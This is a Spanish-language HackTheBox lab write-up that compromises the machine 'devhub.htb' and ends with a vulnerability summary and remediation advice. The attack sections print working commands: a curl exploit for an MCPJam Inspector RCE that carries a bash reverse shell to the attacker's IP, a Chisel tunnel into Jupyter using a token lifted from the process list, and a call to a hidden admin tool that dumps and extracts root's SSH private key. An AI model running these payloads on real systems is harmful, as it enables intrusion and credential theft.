# DevHub — HackTheBox Writeup

<p align="center">
  <img src="https://img.shields.io/badge/Platform-HackTheBox-9FEF00?style=for-the-badge&logo=hackthebox&logoColor=black" alt="HackTheBox">
  <img src="https://img.shields.io/badge/OS-Linux-FCC624?style=for-the-badge&logo=linux&logoColor=black" alt="Linux">
  <img src="https://img.shields.io/badge/Difficulty-Medium-E6B800?style=for-the-badge" alt="Medium">
  <img src="https://img.shields.io/badge/Status-Owned-brightgreen?style=for-the-badge" alt="Owned">
</p>

> Compromiso completo de `devhub.htb` encadenando un **RCE sin autenticación en MCPJam Inspector (CVE-2026-23744)** → pivote a **Jupyter Lab** con token expuesto → abuso de una **herramienta oculta de OPSMCP** para exfiltrar la clave SSH de `root`.

---

## 📑 Tabla de contenidos

- [Ficha técnica](#-ficha-técnica)
- [Cadena de ataque](#-cadena-de-ataque)
- [1. Reconocimiento](#1-reconocimiento)
- [2. Explotación — CVE-2026-23744 (RCE en MCPJam Inspector)](#2-explotación--cve-2026-23744-rce-en-mcpjam-inspector)
- [3. Enumeración interna](#3-enumeración-interna)
- [4. Port forwarding con Chisel](#4-port-forwarding-con-chisel)
- [5. Escalada a `analyst` (Jupyter) — user.txt](#5-escalada-a-analyst-jupyter--usertxt)
- [6. Escalada a `root` (OPSMCP hidden tool) — root.txt](#6-escalada-a-root-opsmcp-hidden-tool--roottxt)
- [Resumen de vulnerabilidades](#-resumen-de-vulnerabilidades)
- [Recomendaciones de remediación](#-recomendaciones-de-remediación)

---

## 🎯 Ficha técnica

| Campo | Valor |
|---|---|
| **Máquina** | `devhub.htb` |
| **Sistema operativo** | Linux (Ubuntu 24.04) |
| **Dificultad** | Media |
| **CVE principal** | CVE-2026-23744 — MCPJam Inspector RCE |
| **Servicios expuestos** | HTTP `80`, MCPJam Inspector `6274`, SSH `22` |
| **Foothold** | `mcp-dev` — RCE sin autenticación |
| **Escalada 1** | `analyst` — Jupyter Notebook API |
| **Escalada 2** | `root` — OPSMCP hidden tool |
| **Fecha** | 2026-06-01 |

---

## 🗺️ Cadena de ataque

```mermaid
flowchart TD
    A[Reconocimiento<br/>Nmap: 80 nginx + 6274 MCPJam] --> B[MCPJam Inspector v1.4.x<br/>expuesto en 0.0.0.0:6274]
    B --> C[CVE-2026-23744<br/>POST /api/mcp/connect → RCE]
    C --> D[Reverse shell<br/>usuario mcp-dev]
    D --> E[Enumeración<br/>Jupyter en 127.0.0.1:8888 + token]
    E --> F[Port forwarding con Chisel<br/>tunnel 8888 → Kali]
    F --> G[Ejecución de código en Jupyter<br/>usuario analyst → user.txt]
    G --> H[Lectura de /opt/opsmcp/server.py<br/>API key + endpoint oculto]
    H --> I[ops._admin_dump → /root/.ssh/id_rsa]
    I --> J[SSH como root → root.txt]

    style C fill:#ff6b6b,stroke:#c92a2a,color:#000
    style J fill:#51cf66,stroke:#2b8a3e,color:#000
```

> **Concepto — Attack chain:** raramente un ataque real depende de una sola vulnerabilidad. Aquí encadenamos 8 pasos donde cada uno abre la puerta al siguiente.

---

## 1. Reconocimiento

Escaneo inicial con Nmap para descubrir puertos y servicios:

```bash
sudo nmap -sS -Pn -sV -sC 10.129.12.114
# -sS  SYN scan (rápido, no completa la conexión TCP)
# -Pn  no hace ping previo (la máquina puede bloquear ICMP)
# -sV  detecta la versión de cada servicio
# -sC  ejecuta los scripts por defecto de detección
```

### Resultado

| Puerto | Servicio | Relevancia |
|---|---|---|
| `22/tcp` | OpenSSH 8.9p1 | Objetivo final — acceso root vía clave privada |
| `80/tcp` | nginx 1.18 | Página informativa DevHub — revela servicios internos |
| `6274/tcp` | MCPJam Inspector | **Vector principal** — RCE sin autenticación (CVE-2026-23744) |

La web del puerto `80` expone una plataforma interna *DevHub* con tres servicios: **MCPJam Inspector** (activo en `6274`), **Jupyter Analytics** (solo `localhost:8888`) y un repositorio de código en mantenimiento. Esta información fue clave para planear el ataque.

---

## 2. Explotación — CVE-2026-23744 (RCE en MCPJam Inspector)

### La vulnerabilidad

`CVE-2026-23744` es un **Remote Code Execution** en MCPJam Inspector `<= 1.4.2`:

- El servicio escucha en `0.0.0.0` (todas las interfaces) en vez de solo `127.0.0.1`.
- El endpoint `/api/mcp/connect` acepta peticiones **sin autenticación**.
- Ese endpoint permite "conectar" un servidor MCP especificando un **comando a ejecutar**, que el servidor lanza como si fuera un proceso MCP legítimo.

> **Blind RCE:** un comando corto como `id` termina de inmediato y el servidor devuelve error porque espera un handshake MCP. El comando *sí* se ejecuta, pero no vemos el output. La solución: una **reverse shell** que mantenga el proceso vivo.

### Listener en Kali

```bash
nc -lvnp 4444
# -l listen  -v verbose  -n sin DNS  -p puerto
```

### Envío del exploit

```bash
# Obtener nuestra IP en la VPN de HTB
ifconfig tun0 | grep 'inet ' | awk '{print $2}'
# → 10.10.16.38

# Payload de reverse shell
curl -s -X POST http://devhub.htb:6274/api/mcp/connect \
  -H "Content-Type: application/json" \
  -d '{"serverConfig":{"command":"bash","args":["-c","bash -i >& /dev/tcp/10.10.16.38/4444 0>&1"],"env":{}},"serverId":"pwn1"}'
```

### Shell obtenida

```text
connect to [10.10.16.38] from (UNKNOWN) [10.129.12.114] 46126
mcp-dev@devhub:/opt/mcpjam/node_modules/@mcpjam/inspector$
```

Estabilizamos la shell:

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm
id
# uid=1001(mcp-dev) gid=1001(mcp-dev) groups=1001(mcp-dev)
```

✅ **Foothold como `mcp-dev` (UID 1001).**

---

## 3. Enumeración interna

```bash
ls -la /opt/
# drwxr-xr-x mcp-dev  mcpjam/
# drwxr-xr-x analyst  opsmcp/

ps aux | grep -E 'jupyter|python|analyst'
# analyst 1061 .../jupyter-lab --ip=127.0.0.1 --port=8888 \
#   --ServerApp.token=a7f3b2c9d8e1f4a5b6c7d8e9f0a1b2c3d4e5f6a7
# root    1068 .../python3 /opt/opsmcp/server.py

ss -tlnp | grep 8888
# LISTEN 0 128 127.0.0.1:8888 0.0.0.0:*
```

> **Hallazgo crítico — token de Jupyter:** el token de autenticación aparece en texto plano en la línea de comando del proceso (`a7f3b2c9...`). Esto nos da acceso a Jupyter **sin conocer ninguna contraseña**. Jupyter ejecuta código Python con los permisos del usuario que lo inició — aquí, `analyst`.

---

## 4. Port forwarding con Chisel

Jupyter escucha solo en `127.0.0.1:8888`, así que no es accesible directamente desde Kali. Montamos un túnel con **Chisel** (TCP sobre HTTP/WebSocket).

```bash
# === EN KALI ===
wget https://github.com/jpillora/chisel/releases/download/v1.10.0/chisel_1.10.0_linux_amd64.gz
gunzip chisel_1.10.0_linux_amd64.gz && chmod +x chisel_1.10.0_linux_amd64
mv chisel_1.10.0_linux_amd64 /tmp/chisel_server

/tmp/chisel_server server --reverse --port 9000   # servidor chisel
cd /tmp && python3 -m http.server 8080            # para transferir el binario
```

```bash
# === EN LA SHELL DE mcp-dev ===
cd /tmp
curl http://10.10.16.38:8080/chisel_server -o chisel && chmod +x chisel

# R:8888:localhost:8888 → abre el 8888 en Kali y lo redirige al 8888 de la víctima
./chisel client 10.10.16.38:9000 R:8888:localhost:8888
# client: Connected (Latency 227ms)
```

✅ **Túnel activo.** Jupyter accesible desde Kali en `http://127.0.0.1:8888`.

---

## 5. Escalada a `analyst` (Jupyter) — user.txt

Abrimos en el navegador:

```
http://127.0.0.1:8888/lab?token=a7f3b2c9d8e1f4a5b6c7d8e9f0a1b2c3d4e5f6a7
```

Creamos un notebook Python 3 y leemos la flag de usuario:

```python
import subprocess
print(subprocess.check_output(['cat', '/home/analyst/user.txt']).decode())
print(subprocess.check_output(['id']).decode())
# user.txt → [REDACTED]  (ver nota sobre flags en el repo)
# uid=1002(analyst) gid=1002(analyst) groups=1002(analyst)
```

🚩 **user.txt capturada como `analyst`.**

### Lectura del servidor OPSMCP

Hay un proceso corriendo como `root`: `/opt/opsmcp/server.py`. Como `analyst` podemos **leerlo**:

```python
import subprocess
print(subprocess.check_output(['cat', '/opt/opsmcp/server.py']).decode())
```

El código revela:

- **API Key:** `opsmcp_secret_key_4f5a6b7c8d9e0f1a`
- **Puerto:** `5000` en `127.0.0.1`
- **Herramientas visibles:** `ops.system_status`, `ops.list_services`, `ops.check_disk`, `ops.view_logs`
- **Herramientas OCULTAS:** `ops._admin_dump`, `ops._debug_mode`

> **Herramientas ocultas:** las tools con prefijo `_` no aparecen en `/tools/list` pero **sí son ejecutables**. `ops._admin_dump` puede dumpear credenciales, incluida la clave SSH privada de `root`.

---

## 6. Escalada a `root` (OPSMCP hidden tool) — root.txt

El servidor Flask corre en `127.0.0.1:5000` con autenticación por header `X-API-Key` y un endpoint `/tools/call`. Invocamos la tool oculta con `target=ssh_keys`:

```python
import subprocess, json

result = subprocess.check_output([
    'curl', '-s', '-X', 'POST', 'http://127.0.0.1:5000/tools/call',
    '-H', 'X-API-Key: opsmcp_secret_key_4f5a6b7c8d9e0f1a',
    '-H', 'Content-Type: application/json',
    '-d', '{"name":"ops._admin_dump","arguments":{"target":"ssh_keys","confirm":true}}'
]).decode()

key = json.loads(result)['root_private_key']
with open('/home/analyst/notebooks/root_key.txt', 'w') as f:
    f.write(key)
print('Clave guardada!')
```

Descargamos la clave vía la API de Jupyter desde Kali:

```bash
curl -s 'http://127.0.0.1:8888/api/contents/root_key.txt?content=1' \
  -H 'Authorization: token a7f3b2c9d8e1f4a5b6c7d8e9f0a1b2c3d4e5f6a7' \
  | python3 -c 'import sys,json; print(json.load(sys.stdin)["content"])' > /tmp/root_key

chmod 600 /tmp/root_key
head -1 /tmp/root_key
# -----BEGIN OPENSSH PRIVATE KEY-----
```

Conexión final como `root`:

```bash
ssh -i /tmp/root_key root@devhub.htb
# root@devhub:~#
cat /root/root.txt
# root.txt → [REDACTED]
```

🚩 **root.txt capturada. Máquina comprometida por completo.**

---

## 🔎 Resumen de vulnerabilidades

| # | Vulnerabilidad | Severidad | Impacto |
|---|---|---|---|
| 1 | CVE-2026-23744 — MCPJam RCE | **Crítica (9.8)** | Ejecución de comandos sin autenticación como `mcp-dev` |
| 2 | Token de Jupyter expuesto en `ps` | Alta | Token visible en la lista de procesos → acceso como `analyst` |
| 3 | OPSMCP con herramientas ocultas | **Crítica** | `ops._admin_dump` lee `/root/.ssh/id_rsa` sin restricción adicional |
| 4 | Clave SSH de root sin passphrase | Alta | La clave privada es utilizable directamente aunque sea robada |
| 5 | Servicios internos sin MFA | Media | Jupyter y OPSMCP solo usan token/API key, sin segundo factor |

---

## 🛡️ Recomendaciones de remediación

| Prioridad | Acción | Detalle |
|---|---|---|
| **Crítica** | Actualizar MCPJam | A `v1.4.3+` (corrige CVE-2026-23744) y configurar escucha solo en `127.0.0.1` |
| **Crítica** | Auth en OPSMCP | `ops._admin_dump` no debe ser accesible con solo una API key; exigir autenticación adicional y logging |
| **Alta** | Proteger token de Jupyter | No iniciar con `--ServerApp.token` en argumentos visibles; usar archivo de config con permisos restringidos |
| **Alta** | Passphrase en clave SSH de root | La clave debe tener una passphrase fuerte |
| **Media** | Mínimo privilegio | OPSMCP no necesita correr como `root`; usar un usuario dedicado con acceso limitado |
| **Media** | Segmentación de red | Jupyter y OPSMCP son internos; no deberían ser alcanzables vía port forwarding por usuarios no autorizados |

---

<p align="center">
  <sub>Escrito con fines <b>educativos</b>. Máquina resuelta en el laboratorio legal y controlado de HackTheBox.</sub>
</p>